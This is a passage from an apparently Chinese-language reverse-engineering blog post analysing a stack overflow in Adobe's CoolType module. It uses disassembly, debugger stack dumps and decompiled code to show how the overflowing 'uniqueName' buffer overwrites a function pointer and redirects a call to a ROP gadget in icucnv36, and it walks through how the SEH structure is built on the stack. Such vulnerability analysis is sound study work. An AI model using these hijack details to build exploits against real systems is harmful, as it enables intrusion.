[ebp+0x14]=[0x0012DD7C]=0x0012DDE4</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB3B      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_8]             <span class="comment">; arg2&lt;-a3: [ebp+0x10]=[0x0012DD78]=0x0012DDC8</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB3E      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]             <span class="comment">; arg1&lt;-a2: [ebp+0xC]=[0x0012DD74]=0x0012E718 &lt;------ 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB41      <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]         <span class="comment">;   [eax]=0x808B116(StreamHandler类虚函数)</span></span><br><span class="line">                                           <span class="built_in">esp</span> --&gt;  0012DD4C  0801BB43  返回到 CoolType.0801BB43</span><br><span class="line">                                                    0012DD50  0012E718  arg1 对象(<span class="number">0x0012E718</span>)的指针</span><br><span class="line">                                                    0012DD54  0012DDC8  arg2</span><br><span class="line">                                                    0012DD58  0012DDE4  arg3</span><br><span class="line">                                                    0012DD5C  <span class="number">00000000</span>  arg4</span><br><span class="line">                                                    0012DD60  <span class="number">00000000</span>  arg5</span><br><span class="line">                                                    0012DD64  <span class="number">00000001</span>  arg6</span><br><span class="line">                                           <span class="built_in">ebp</span> --&gt;  0012DD68  0012DDF8  </span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">****************************************************************************************************************************</span><br><span class="line"></span><br><span class="line"><span class="symbol">.rdata:</span>081A601C <span class="comment">; const StreamHandler::`vftable'</span></span><br><span class="line"><span class="symbol">.rdata:</span>081A601C ??_7StreamHandler@@6B@ <span class="built_in">dd</span> offset sub_808B116</span><br><span class="line"></span><br><span class="line">StreamHandler类虚函数：</span><br><span class="line">char __thiscall sub_808B116(char *this, <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3, _<span class="built_in">DWORD</span> *a4, _<span class="built_in">DWORD</span> *a5, unsigned <span class="keyword">int</span> *a6, <span class="keyword">int</span> a7)</span><br><span class="line"></span><br><span class="line">****************************************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0808B116      <span class="keyword">push</span>    <span class="built_in">ebp</span>                 <span class="comment">;   [0x0012DD48]=ebp=0x0012DD68</span></span><br><span class="line"><span class="symbol">.text:</span>0808B117      <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>            <span class="comment">;   ebp=esp=0x0012DD48</span></span><br><span class="line"><span class="symbol">.text:</span>0808B119      <span class="keyword">push</span>    <span class="built_in">ecx</span>                 <span class="comment">; arg_5: [0x0012DD44]=ecx=0x01F347B8(StreamHandler类对象地址)</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11A      <span class="keyword">push</span>    <span class="built_in">ebx</span>                 <span class="comment">; arg_4: [0x0012DD40]=ebx=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11B      <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">; arg_3: [0x0012DD3C]=esi=0x0012E608 对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11C      <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">; arg_2: [0x0012DD38]=edi=0x0012E718 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0808B11D      <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+arg_0]    <span class="comment">;   edi=[ebp+0x8]=[0x0012DD50]=0x0012E718 &lt;------ edi = a2</span></span><br><span class="line"><span class="symbol">.text:</span>0808B120      <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">; arg_1: [0x0012DD34]=edi=0x0012E718 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0808B121      <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>            <span class="comment">;   esi=ecx=0x01F347B8(StreamHandler类对象地址)</span></span><br><span class="line"><span class="symbol">.text:</span>0808B123      <span class="keyword">call</span>    sub_808B02A         <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>0808B128      <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B12A      <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>0808B12C      <span class="keyword">jz</span>      loc_808B2CB</span><br><span class="line">..........</span><br><span class="line"><span class="symbol">.text:</span>0808B2CB      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]</span><br><span class="line"><span class="symbol">.text:</span>0808B2CD      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_14+<span class="number">3</span>], <span class="built_in">bl</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2D0      <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">70h</span>]</span><br><span class="line"><span class="symbol">.text:</span>0808B2D3      <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2D4      <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">esi</span>+<span class="number">14h</span>]</span><br><span class="line"><span class="symbol">.text:</span>0808B2D7      <span class="keyword">call</span>    sub_801E540</span><br><span class="line"><span class="symbol">.text:</span>0808B2DC      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">0E0h</span>], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2E3      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>+<span class="number">3Ch</span>]   &lt;-------<span class="built_in">eax</span>=[<span class="built_in">edi</span>+<span class="number">3Ch</span>]=[<span class="number">0x0012E718</span>+<span class="number">0x3C</span>]=[<span class="number">0x0012E754</span>]=<span class="number">0x0012E6D0</span>(对象<span class="number">0x0012E6B0</span>中的一个函数指针)</span><br><span class="line"><span class="symbol">.text:</span>0808B2E6      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2E8      <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">2F4h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2EE      <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">2F8h</span>], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2F4      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2F7      <span class="keyword">jnz</span>     short loc_808B300</span><br><span class="line"><span class="symbol">.text:</span>0808B2F9</span><br><span class="line"><span class="symbol">.text:</span>0808B2F9 loc_808B2F9:                      </span><br><span class="line"><span class="symbol">.text:</span>0808B2F9      <span class="keyword">xor</span>     <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>0808B2FB      <span class="keyword">jmp</span>     loc_808B594</span><br><span class="line"><span class="symbol">.text:</span>0808B300 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0808B300</span><br><span class="line"><span class="symbol">.text:</span>0808B300 loc_808B300:                           </span><br><span class="line"><span class="symbol">.text:</span>0808B300      <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span>0808B303      <span class="keyword">push</span>    <span class="built_in">ecx</span>                 <span class="comment">; [0x0012DD34]=ecx=0x0012DD44</span></span><br><span class="line"><span class="symbol">.text:</span>0808B304      <span class="keyword">push</span>    <span class="built_in">ebx</span>                 <span class="comment">; [0x0012DD30]=ebx=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>0808B305      <span class="keyword">push</span>    <span class="number">3</span>                   <span class="comment">; [0x0012DD2C]=0x3</span></span><br><span class="line"><span class="symbol">.text:</span>0808B307      <span class="keyword">push</span>    <span class="built_in">eax</span>                 <span class="comment">; [0x0012DD28]=eax=0x0012E6D0</span></span><br><span class="line"><span class="symbol">.text:</span>0808B308      <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]     <span class="comment">; eax=0x0012E6D0,[0x0012E6D0]=0x4A80CB38 &lt;------- ROPgadget1</span></span><br><span class="line">                    (*v20)(v20, <span class="number">3</span>, <span class="number">0</span>, &amp;v31)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p><strong><code>触发流程图:</code></strong></p><div align="left"><img src="/resources/2018/2018-06-01-04.png" width="80%" height="60%" alt="触发流程"></div><p>&emsp;&emsp;这里不知道为什么不能用ollydbg的<code>调用堆栈窗口</code>查看栈回溯,在调用<code>sub_808B116()</code>函数时,<code>栈回溯窗口</code>清空了,执行完<code>sub_808B116()</code>函数中的<code>0x0808B308</code>处的调用指令<code>call dword ptr [eax]</code>,跳转到<code>0x4A80CB38</code>处时,<code>调用堆栈信息</code>又显示出来了,而且此<code>ROPgadget的调用者</code>也发生了改变。下面显示<code>0x4A80CB38</code>处的<code>ROPgadget</code>的调用是来自<code>CoolType.0801BB41</code>,而这个地址在<code>sub_801BB21()</code>函数的地址范围中,并且是<code>调用sub_808B116()</code>函数的指令的地址。实际情况确是<code>sub_808B116()</code>函数调用的<code>0x4A80CB38</code>处的<code>ROPgadget</code>。是因为sub_808B116()函数是虚函数吗？没搞清楚。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--&gt; 4A80CB38    81C5 <span class="number">94070000</span>   <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x794</span></span><br><span class="line">    4A80CB3E    C9              <span class="keyword">leave</span></span><br><span class="line">    4A80CB3F    C3              <span class="keyword">retn</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;调用堆栈：     主线程</span></span><br><span class="line"><span class="comment">;地址        堆栈       函数过程 / 参数          调用来自                结构</span></span><br><span class="line"><span class="comment">;0012DD4C   0801BB43   icucnv36.4A80CB38       CoolType.0801BB41      0012DD48</span></span><br><span class="line"><span class="comment">;0012DD6C   08016C5B   ? CoolType.0801BB21     CoolType.08016C56      0012DD68</span></span><br><span class="line"><span class="comment">;0012E460   0803DEB4   ? CoolType.08016BDE     CoolType.0803DEAF      0012DDF8</span></span><br></pre></td></tr></table></figure><h5 id="2-4、触发原因"><a href="#2-4、触发原因" class="headerlink" title="2.4、触发原因"></a>2.4、触发原因</h5><p>&emsp;&emsp;通过前面的分析我们可以知道,地址<code>0x0808B308</code>处的<code>调用指令</code>是通过以<code>eax的值</code>为地址,得到存储在<code>地址处的值</code>,作为所调用<code>函数的地址</code>,进行函数调用的。<code>eax=0x0012E6D0</code>,所以<code>函数的地址值</code>存储在<code>栈</code>上,而且刚好落在我们构造的<code>“uniqueName”字段</code>在栈上的缓冲区内,所以我们可以<code>覆盖</code>这个函数的<code>地址值</code>,达到<code>劫持程序控制流</code>的目的。而我们往上回溯,<code>eax的值</code>是以<code>edi+0x3C</code>为地址的变量的值。<code>edi</code>的值为<code>0x0012E718</code>,正是前面通过<code>sub_80DD0B3()</code>函数调用<code>sub_080151B5()</code>函数清零的<code>栈空间的首地址</code>,也是<code>sub_80DD0B3()</code>函数的<code>ebp</code>。在执行<code>sub_80DD0B3()</code>函数之前,<code>edi+0x3C=0x0012E754</code>处的值为<code>0xFFFFFFFF</code>,而在调用<code>0x080DD2F3</code>处的<code>sub_803DCF9()</code>函数时,已经被赋值为了<code>0x0012E6D0</code>。说明赋值的语句在调用<code>sub_803DCF9()</code>函数之前。这里<code>分析的目的</code>主要是看是否覆盖了<code>特殊结构的指针</code>,而达到了程序<code>控制流的劫持</code>。比如,是否覆盖了<code>SEH异常处理结构</code>,又或者是覆盖了<code>虚表指针</code>和虚表中的<code>虚函数地址</code>。首先在IDA中看一下,是哪里赋的值：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80DD0B3</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _DWORD *a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">int</span> v10; <span class="comment">// [esp+B8h] [ebp-68h],[0x0012E718-0x68]=[0x0012E6B0]</span></span><br><span class="line">    <span class="keyword">char</span> v11; <span class="comment">// [esp+D8h] [ebp-48h],[0x0012E718-0x48]=[0x0012E6D0]存储函数地址的变量(函数指针)</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">char</span> v31; <span class="comment">// [esp+134h] [ebp+14h],[0x0012E718+0x14]=[0x0012E72C]</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v32; <span class="comment">// [esp+15Ch] [ebp+3Ch],[0x0012E718+0x3C]=[0x0012E754]</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//&amp;v10为对象首地址,此函数应为对象(0x0012E6B0)的有参构造函数</span></span><br><span class="line">    sub_8083452(&amp;v10, a2);<span class="comment">//执行完后,[ebp-0x48]=[0x0012E6D0]=0x080833EF,这是一个函数的地址</span></span><br><span class="line">    v25 = <span class="number">1</span>;</span><br><span class="line">    sub_8084D13(</span><br><span class="line">        (<span class="keyword">void</span> (__cdecl **)(_DWORD, _DWORD, _DWORD, _DWORD))(v10 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v11 : <span class="number">0</span>),</span><br><span class="line">        &amp;v20,</span><br><span class="line">        &amp;v18,</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v17,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>);</span><br><span class="line">    ......</span><br><span class="line">    sub_801605B(&amp;v31, &amp;v10); <span class="comment">//&amp;v31为对象首地址</span></span><br><span class="line">    v32 = v10 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v11 : <span class="number">0</span>; <span class="comment">//[0x0012E754]=0x0012E6D0,v32[0x0012E754]为对象(0x0012E718)中的一个成员变量</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">对象(0x0012E6B0)的内存布局(初始):</span></span><br><span class="line"><span class="comment">0x0012E6B0 *v2 = *a2     -| &#123;sub_8014E64&#125;</span></span><br><span class="line"><span class="comment">0x0012E6B4 v2[1] = a2[1] -|</span></span><br><span class="line"><span class="comment">0x0012E6B8 v2[2] = 0; ------------------------|</span></span><br><span class="line"><span class="comment">0x0012E6BC *a2 = v9   -|                      |</span></span><br><span class="line"><span class="comment">0x0012E6C0 a2[1] = a3  |                      |</span></span><br><span class="line"><span class="comment">0x0012E6C4 a2[2] = v8  | &#123;sub_8080FB5&#125;        | &#123;sub_8083452&#125;</span></span><br><span class="line"><span class="comment">0x0012E6C8 a2[3] = v7 -|                      |</span></span><br><span class="line"><span class="comment">0x0012E6CC v2[7] = v2[5] ---------------------|</span></span><br><span class="line"><span class="comment">0x0012E6D0 v2[8] = sub_80833EF ---------------| (函数指针)</span></span><br><span class="line"><span class="comment">0x0012E6D4 v2[9] = v2 ------------------------|</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;由这可知,<code>v32变量</code>在栈上的位置为<code>ebp+0x3C</code>,即v32为栈上<code>0x0012E718+0x3C=0x0012E754</code>处的变量。最下面的那一行代码是它的<code>赋值语句</code>。由于我对<code>SEH结构</code>是怎么被放在<code>栈</code>上,并形成<code>SEH链表</code>的细节不太熟悉,所以,顺便分析了一下函数向栈上<code>构建SEH结构</code>的过程。下面是一些详细的调试信息：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line">***********************************************************************************</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> __cdecl sub_80DD0B3(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _<span class="built_in">DWORD</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">***********************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>080DD0B3        <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">; [0x0012E7E8]=ebp=0x0012E838,父函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0B4        <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0CCh</span>                        <span class="comment">; esp=0x0012E71C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BA        <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                     <span class="comment">; ebp=0x0012E718,本函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BE        <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie          <span class="comment">; eax=0x78FC1194</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C3        <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78EEF68C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C5        <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_4], <span class="built_in">eax</span>            <span class="comment">; [ebp+0xcc] = [0x0012E7E4] = 0x78EEF68C,父函数ebp之上</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0CB        <span class="keyword">push</span>    <span class="number">104h</span>                             <span class="comment">; [esp-0x4]=[0x0012E718]=0x104,(__EH_prolog3中分配的栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D0        <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8182A36          <span class="comment">; eax=0x8182A36(__security_check_cookie函数地址)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D5        <span class="keyword">call</span>    __EH_prolog3                     <span class="comment">; [0x0012E714]=ret=0x080DD0DA</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>0804819E __EH_prolog3    proc <span class="built_in">near</span>(向栈上写入SEH结构)</span><br><span class="line"></span><br><span class="line">0804819E       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E710]=eax=0x08182A36(__security_check_cookie函数地址)SE处理程序</span></span><br><span class="line">0804819F       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]               <span class="comment">; [0x0012E70C]=0x0012E82C,指向下一个SEH记录的指针</span></span><br><span class="line">080481A6       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; eax=esp+0xc=0x0012E70C+0xC=0x0012E718</span></span><br><span class="line">080481AA       <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; esp=esp-[0x0012E718]=0x0012E70C-0x104=0x0012E608,分配栈空间</span></span><br><span class="line">                                                栈: 0012E608   7C812FD3  返回到 kernel32.7C812FD3 来自 ntdll.RtlRaiseException</span><br><span class="line">080481AE       <span class="keyword">push</span> <span class="built_in">ebx</span>                            <span class="comment">; [0x0012E604]=ebx=0x0</span></span><br><span class="line">080481AF       <span class="keyword">push</span> <span class="built_in">esi</span>                            <span class="comment">; [0x0012E600]=esi=0x0823AE9C(.data段)</span></span><br><span class="line">080481B0       <span class="keyword">push</span> <span class="built_in">edi</span>                            <span class="comment">; [0x0012E5FC]=edi=0x0012E858</span></span><br><span class="line">080481B1       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="built_in">ebp</span>          <span class="comment">; [eax]=[0x0012E718]=ebp=0x0012E718,覆盖传进来的参数0x104</span></span><br><span class="line">080481B3       <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">eax</span>                         <span class="comment">; </span></span><br><span class="line">080481B5       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x8230FB8</span>]    <span class="comment">; eax=ds:[0x8230FB8]=0x78FC1194(___security_cookie)</span></span><br><span class="line">080481BA       <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78FC1194^0x0012E718=0x78EEF68C,再计算一次security cookie</span></span><br><span class="line">080481BC       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E5F8]=eax=0x78EEF68C,异或之后的sec cookie</span></span><br><span class="line">080481BD       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>]         <span class="comment">; [0x0012E5F4]=[0x0012E718-0x4]=[0x0012E714]=0x080DD0DA,返回地址</span></span><br><span class="line">080481C0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>],-<span class="number">0x1</span>     <span class="comment">; [0x0012E714]=0xFFFFFFFF,本来的返回地址被修改</span></span><br><span class="line">080481C7       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xC</span>]      <span class="comment">; eax=ebp-0xc=0x0012E718-0xc=0x0012E70C(本SEH结构地址)</span></span><br><span class="line">080481CA       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">eax</span>            <span class="comment">; fs:[0] = 0x0012E70C,保存当前SEH结构指针</span></span><br><span class="line">080481D0       <span class="keyword">retn</span>                                <span class="comment">; ret</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>080DD113 loc_80DD113:                            <span class="comment">; CODE XREF: sub_80DD0B3+5B↑j</span></span><br><span class="line"><span class="symbol">.text:</span>080DD113                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; eax=a2=0x0012E818,[0x0012E818]=0x0494F3E8</span></span><br><span class="line"><span class="symbol">.text:</span>080DD114                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_138]          <span class="comment">; eac=ebp-0x68=0x0012E718-0x68=0x0012E6B0,对象(0x0012E6B0)首地址</span></span><br><span class="line"><span class="symbol">.text:</span>080DD117                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_F0], <span class="number">40000000h</span>     <span class="comment">; [ebp-0x20]=[0x0012E718-0x20]=[0x0012E6F8]=0x40000000</span></span><br><span class="line"><span class="symbol">.text:</span>080DD11E                 <span class="keyword">call</span>    sub_8083452</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">********************************************************************</span><br><span 